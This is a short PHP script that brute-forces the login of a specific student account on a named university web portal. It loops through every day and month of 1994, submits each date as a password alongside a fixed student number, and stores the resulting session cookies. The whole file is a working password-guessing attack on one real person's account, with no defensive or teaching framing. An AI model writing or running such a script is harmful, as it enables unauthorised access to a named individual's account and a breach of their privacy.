<?php
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,'http://webstream.sastra.edu/sastrapwi/usermanager/youLogin.jsp');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_COOKIEJAR,'prinku.txt');
curl_setopt($ch,CURLOPT_POST,1);
set_time_limit(0);
for($i=1;$i<=12;$i++)
{
  for($j=1;$j<=31;$j++)
	{
		if($i<10) $m='0'.$i;
		else $m="".$i;
		if($j<10) $d='0'.$j;
		else $d="".$j;
		$pass=$d.$m.'1994';
		$data='txtSN=115015104'.'&txtPD='.$pass.'&txtPA=1&txtRegNumber=iamalsouser&txtPwd=thanksandregards';
		echo "testing:".$pass."<br/>";
		curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
		$res=curl_exec($ch);
	}
}
?>
